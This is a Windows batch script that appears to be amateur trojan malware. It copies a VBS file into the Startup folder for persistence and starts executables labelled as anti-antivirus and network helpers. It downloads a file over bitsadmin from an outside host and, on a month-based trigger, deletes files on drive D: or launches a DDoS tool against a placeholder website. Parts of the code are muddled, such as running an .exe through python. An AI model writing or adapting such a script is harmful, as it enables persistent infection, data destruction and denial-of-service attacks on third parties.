@echo off
cls
:check if exist
if exist "C:\Users\data\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\pythonhandeler.vbs" goto checkthedate
if not exist "C:\Users\data\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\pythonhandeler.vbs" goto copy
:checkthedate
for /f %%i in ('powershell ^(get-date^).Month') do set dow=%%i
if %dow%==2 goto ddosattack
if %dow%==5 goto payload2
:copy
if not exist "C:\Users\data\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\pythonhandeler.vbs" xcopy "%cd%\pythonhandeler.vbs" "C:\Users\data\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
if exist "C:\Users\data\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\pythonhandeler.vbs" goto format
goto format
:format
start bigdatahandeler.exe
goto antiantivirus
:antiantivirus
start connecttotheinternet.exe
goto bitsadmin
:bitsadmin
bitsadmin.exe /transfer "downloadstockfish" "https://stockfishchess.org/files/stockfish_12_win_x64.zip" "C:\program files\kindoftrojan\stockfish_12_win_x64.zip"
goto pythonunzip
:pythonunzip
python crashhandeler.exe
:del thedisk
del "C:\program files\kindoftrojan\stockfish_12_win_x64.zip"
cd "C:\program files\kindoftrojan\data"
cls
goto starttockfish
:starttockfish
start stockfish_20090216_x64.exe
goto check if exist
:payload2
del /q "D:\"
start data.vbs
goto close
:close
exit
:ddosattack
ddos.exe (((website that you wanna attack))) 80 10000
goto  close
